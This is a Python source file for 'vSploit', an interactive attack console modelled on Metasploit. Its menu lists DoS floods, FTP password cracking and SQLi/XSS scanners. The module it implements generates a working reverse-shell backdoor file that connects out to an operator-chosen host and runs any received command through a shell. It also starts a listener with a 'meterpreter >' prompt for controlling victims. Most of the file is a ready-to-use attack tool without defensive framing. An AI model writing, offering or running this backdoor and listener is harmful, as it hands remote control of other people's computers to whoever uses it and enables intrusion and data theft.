import aiohttp
import asyncio
import colorama
import ftplib
import os 
import requests
import time
import socket
import sys
import threading
from colorama import Fore
from colorama import Style

host_ip = 'null'
port_ip = 'null'
set_file = 'null'
url = 'null'

colorama.init()

os.system('cls')
print("")
print("vSploit")
print("")
run = True
while True:
	command_main = input("vmf6 > ")

	if command_main == 'show module':
		def modules():
			print('''
------------------------------------------------
   MODULE                          OPTIONS
------------------------------------------------
reverse_tcp_backdoor       created Backdoor File
http_flood                 HTTP FLood Attack (DoS)
http_dos_attack            DoS Attack
http_tcp_dos               DoS Layer4 (TCP)
reverse_ftpd_crack         FTPd Cracked (PASSWORD)
sqli_scan                  SQLi Checking Vulns
xss_scan                   XSS Checking Vulns
------------------------------------------------
''')

		modules()

	elif command_main == 'help':
		def helping():
			print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 show module                 show all module
 set module                  update module
 help                        command for helping
-----------------------------------------------
 ''')

		helping()

	elif command_main == 'exit':
		print("[+] Session CLosed")
		exit()

	elif command_main == 'set module':
		set_module = input("[+] NAME MODULE : ")

		if set_module == 'reverse_tcp_backdoor':
			while True:
				module = input("vmf6(reverse_tcp_backdoor) > ")


				if module == 'exit module':
					print("")
					print("[+] Back module")
					print("")
					break

				elif module == 'help':
					def helping1():
						print('''
------------------------------------------------
  Command                      Options
------------------------------------------------
 options                    show options
 set host                   update host system
 set port                   update port system 
 set file                   update file name
 exploit                    start exploit
 exit module                exit module
 help                       command for helping
-----------------------------------------------
 ''')

					helping1()

				elif module == 'set host':
					host_ip = input("[+] HOST : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set host => {host_ip}")

				elif module == 'set port':
					port_ip = input("[+] PORT : ")
					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set PORT => {port_ip}")

				elif module == 'set file':
					set_file = input("[+] File Name : ")

					code = f'''
import socket
import subprocess
import os

IP = '{host_ip}'
PORT = {port_ip}

def connection():
	connect_session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect_session.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	connect_session.connect((IP, PORT))

	session = True
	while True:

		send_data = connect_session.recv(1024)

		if send_data == b'exit':
			print("[+] Close Session")
			connect_session.close()
			break

		else:

			proc_session = subprocess.Popen(send_data,
				shell=True,
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE,
				stdin=subprocess.PIPE)

			output_data = proc_session.stdout.read() + proc_session.stderr.read()

			connect_session.send(output_data)

connection()
'''

					with open(f'{set_file}', 'w') as filename:
						filename.write(code)

					print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" set filename => {set_file}")

				elif module == 'options':
					def options():
						print(f'''
------------------------------------------------
   	               OPTIONS
------------------------------------------------
   HOST       :  {host_ip}       
   PORT       :  {port_ip}
   FILE NAME  :  {set_file}
   PAYLOAD    :  {set_module}
-----------------------------------------------
''')
					options()


				elif module == "exploit":
					import socket
					import sys
					import os 

					HOST = str(f'{host_ip}')
					PORT = int(port_ip)

					def connection():
						connector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						connector.setsockopt(socket.SOL_SOCKET,
							socket.SO_REUSEADDR,
							2)
						connector.bind((HOST, PORT))
						connector.listen(2)

						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On ' + Fore.GREEN + f'{host_ip}:{port_ip}' + Style.RESET_ALL)
						time.sleep(2)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
						time.sleep(1)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ Fore.GREEN + str(host_ip) + ":" + str(port_ip) + '...' + Style.RESET_ALL)
						
						conn, addr = connector.accept()
						
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', Fore.GREEN, addr)
						time.sleep(2)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', Fore.GREEN, addr)
						time.sleep(1)
						print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ' + Fore.GREEN + str(addr) + '...' + Style.RESET_ALL)

						session = True
						print("")
						while True:
							sys.stdout.write(Fore.BLUE + "meterpreter > " + Style.RESET_ALL)
							cmd_shell = sys.stdin.readline()

							if cmd_shell == b'exit\n':
								print("[+] Closed Session")
								conn.send(b'exit\n')
								conn.close()

							elif cmd_shell != '\n':
								conn.send(cmd_shell.encode())
								cmd_output = conn.recv(1024)
								print(cmd_output)
					connection()
